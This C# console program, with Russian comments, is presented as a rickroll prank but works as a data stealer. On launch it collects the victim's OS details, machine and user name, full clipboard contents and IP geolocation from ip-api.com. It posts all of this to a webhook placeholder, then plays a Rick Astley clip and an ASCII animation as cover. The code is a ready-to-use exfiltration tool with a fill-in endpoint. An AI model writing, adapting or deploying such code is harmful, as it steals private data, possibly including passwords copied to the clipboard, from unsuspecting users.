using NAudio.Wave; // NAuido from NuGet*
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;
using System.Text.Encodings.Web;
using System.Text.Json;
using System.Text.Unicode;
using System.Threading.Tasks;
using System.Windows.Documents;
using System.Windows.Documents.DocumentStructures;
using System.Windows.Forms;
namespace CMD_Csharp_EDITION
{
    internal class Program
    {
        static string rickrol_url = "https://zvukoviku.ru/sounds/1651485572_18775-rickroll354.mp3";
        static Thread play_rick = new Thread(() =>
        {
            using (var mf = new MediaFoundationReader(rickrol_url))
            using (var wo = new WasapiOut())
            {
                wo.Init(mf);
                wo.Play();
                while (wo.PlaybackState == PlaybackState.Playing)
                {
                    Thread.Sleep(1000);
                }
            } // Копипаста из доков NAudio
        });

        static HttpClient httpClient = new HttpClient();
        static HttpClient httpClient_ip = new HttpClient();
        [STAThread]
        static async Task Main(string[] args)
        {

            Dictionary<string, string> systemInfo = new Dictionary<string, string>();

            systemInfo.Add("OS_INFO", Environment.OSVersion.ToString()); // Windows 10 12.4.16.2.0
            systemInfo.Add("PC_NAME", Environment.MachineName);
            systemInfo.Add("USER", Environment.UserName); // Pro_gamer123 (name of window suser)

            Thread thread = new Thread(() =>
            {
                switch (Clipboard.ContainsText())
                {
                    case true:
                        systemInfo.Add("CLIPBOARD_TEXT", Clipboard.GetText());
                        break;

                    case false:
                        systemInfo.Add("CLIPBOARD_TEXT", "[THERE IS NO TEXT OR IT'S NOT A TEXT]");
                        break;
                }
            }); // Проверка буфера вынесена в отдельный статичный поток (можно увидеть ниже) иначе бы условие всегда возвращало false

            thread.SetApartmentState(ApartmentState.STA); // Установка режима
            thread.Start();
            thread.Join(); // Ждем завершения потока

            systemInfo.Add("ARCHITECTURE", RuntimeInformation.OSArchitecture.ToString()); //X86

            systemInfo.Add("PROCESSOR_COUNT", Environment.ProcessorCount.ToString()); //Ядра процессора

            string prettyJson; // Обьявление до блока try-catch
            try
            {
                using var request_ip = new HttpRequestMessage(HttpMethod.Get, "http://ip-api.com/json/?lang=ru&fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query");

                using var response_ip = await httpClient_ip.SendAsync(request_ip);
                string responseIP_text = await response_ip.Content.ReadAsStringAsync();

                var jsonElement = JsonSerializer.Deserialize<JsonElement>(responseIP_text);
                prettyJson = JsonSerializer.Serialize(jsonElement, new JsonSerializerOptions
                {
                    WriteIndented = true,
                    Encoder = JavaScriptEncoder.Create(UnicodeRanges.BasicLatin, UnicodeRanges.Cyrillic)
                });
            }
            catch (Exception except) 
            {
                prettyJson = $"[ОШИБКА ПРИ ПОЛУЧЕНИИ JSON: {except}]";
            }

            string payload = $"""
                ## Чел попался на рикрол :woman_in_manual_wheelchair: :pig2:

                *Информация об IP:*
                ```{prettyJson}```
                
                ### Системная информация :computer:
                Имя ОС: {systemInfo["OS_INFO"]}
                Архитектура процессора: {systemInfo["ARCHITECTURE"]}
                Ядер процессора: {systemInfo["PROCESSOR_COUNT"]}
                
                Имя ПК\\Пользователя: `{systemInfo["PC_NAME"]}\{systemInfo["USER"]}`
                
                *Содержимое буфера обмена:* ```{systemInfo["CLIPBOARD_TEXT"]}```
                
                """;

            var jsonObject = new
            {
                content = payload,
                username = "Rickrol",
                avatar_url = "https://jollycontrarian.com/images/6/6c/Rickroll.jpg?20170403162336",
            };

            string json = JsonSerializer.Serialize(jsonObject);

            StringContent content = new StringContent(json, Encoding.UTF8, "application/json");

            try
            {
                using var request = new HttpRequestMessage(HttpMethod.Post, "YOUR_WEBHOOK"); // webhook here
                request.Content = content;

                using var response = await httpClient.SendAsync(request);
                string responseText = await response.Content.ReadAsStringAsync();

            }
            catch (System.InvalidOperationException) {  }
            finally
            {
                play_rick.Start();
                Console.ForegroundColor = ConsoleColor.Green;
                Process.Start("curl", "ascii.live/rick"); // curl запрос к опен сурс проекту (знаменитый рикрол в консоли)
                play_rick.Join();
            }
        }
    }
}
